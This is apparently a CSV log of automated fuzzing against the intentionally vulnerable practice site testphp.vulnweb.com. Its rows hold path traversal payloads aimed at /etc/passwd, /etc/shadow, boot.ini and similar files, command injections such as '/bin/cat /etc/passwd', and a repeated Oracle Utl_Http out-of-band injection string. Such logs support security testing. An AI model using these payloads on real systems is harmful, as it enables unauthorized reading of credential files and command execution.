id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword,TimeDelay,ContentLength
id_fuzz_1,89,,http://testphp.vulnweb.com/listproducts.php?cat=.\./.\./.\./.\./.\./.\./etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,90,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,91,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,92,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,93,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,94,,http://testphp.vulnweb.com/listproducts.php?cat=%0a/bin/cat%20/etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,95,,http://testphp.vulnweb.com/listproducts.php?cat=%0a/bin/cat%20/etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,96,,http://testphp.vulnweb.com/listproducts.php?cat=%00/etc/passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,97,,http://testphp.vulnweb.com/listproducts.php?cat=%00/etc/shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,98,,http://testphp.vulnweb.com/listproducts.php?cat=%00../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,99,,http://testphp.vulnweb.com/listproducts.php?cat=%00../../../../../../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,100,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../etc/passwd%00.jpg,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,101,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../etc/passwd%00.html,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,102,,http://testphp.vulnweb.com/listproducts.php?cat=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,103,,http://testphp.vulnweb.com/listproducts.php?cat=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,104,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,105,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,106,,http://testphp.vulnweb.com/listproducts.php?cat=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,107,,http://testphp.vulnweb.com/listproducts.php?cat=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,108,,http://testphp.vulnweb.com/listproducts.php?cat=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,109,,http://testphp.vulnweb.com/listproducts.php?cat=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,110,,http://testphp.vulnweb.com/listproducts.php?cat=\&apos;/bin/cat%20/etc/passwd\&apos;,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,111,,http://testphp.vulnweb.com/listproducts.php?cat=\&apos;/bin/cat%20/etc/shadow\&apos;,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,112,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../conf/server.xml,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,113,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../bin/id|,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,114,,http://testphp.vulnweb.com/listproducts.php?cat=C:/inetpub/wwwroot/global.asa,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,115,,http://testphp.vulnweb.com/listproducts.php?cat=C:\inetpub\wwwroot\global.asa,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,116,,http://testphp.vulnweb.com/listproducts.php?cat=C:/boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,117,,http://testphp.vulnweb.com/listproducts.php?cat=C:oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,118,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../localstart.asp%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,119,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../localstart.asp,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,120,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../boot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,121,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,122,,http://testphp.vulnweb.com/listproducts.php?cat=/./././././././././././boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,123,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,124,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,125,,http://testphp.vulnweb.com/listproducts.php?cat=/..\../..\../..\../..\../..\../..\../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,126,,http://testphp.vulnweb.com/listproducts.php?cat=/.\./.\./.\./.\./.\./.\./boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,127,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,128,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..oot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,129,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,130,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00.html,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,131,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00.jpg,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,132,,http://testphp.vulnweb.com/listproducts.php?cat=/.../.../.../.../.../,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,133,,http://testphp.vulnweb.com/listproducts.php?cat=..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,134,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
